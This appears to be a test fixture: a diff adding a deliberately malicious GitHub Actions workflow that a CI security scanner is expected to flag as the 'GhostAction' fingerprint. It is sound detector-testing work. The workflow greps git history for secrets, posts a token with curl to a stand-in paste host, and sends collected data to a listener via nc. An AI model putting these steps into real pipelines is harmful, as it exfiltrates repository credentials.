@@ -1,0 +1,31 @@
+# Rule 12: the GhostAction fingerprint.
+#
+# Expected: 1 finding, Block, PPE-012.
+#
+# All five components fire here, so the fingerprint is unmistakable.
+name: the fingerprint
+on:
+  # Rule 7: unfiltered push, the entry point for a compromised maintainer token.
+  push:
+
+jobs:
+  harvest-and-exfil:
+    runs-on: ubuntu-latest
+    steps:
+      # Rule 6: full history plus a scan of it, which reads every secret ever
+      # committed including ones rotated long ago.
+      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567
+        with:
+          fetch-depth: 0
+      - name: look for credentials in the history
+        run: git log -p | grep -iE "api[_-]?key|secret|token"
+
+      # Rule 5: a credential pattern in a script.
+      - name: collect what the history turned up
+        run: |
+          export DEPLOY_KEY="ghp_EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAM"
+          curl -X POST -d "key=$DEPLOY_KEY" https://api.paste.example/v1
+
+      # Rule 4: a literal endpoint in a script.
+      - name: send it somewhere
+        run: nc 203.0.113.7 4444 < /tmp/collected
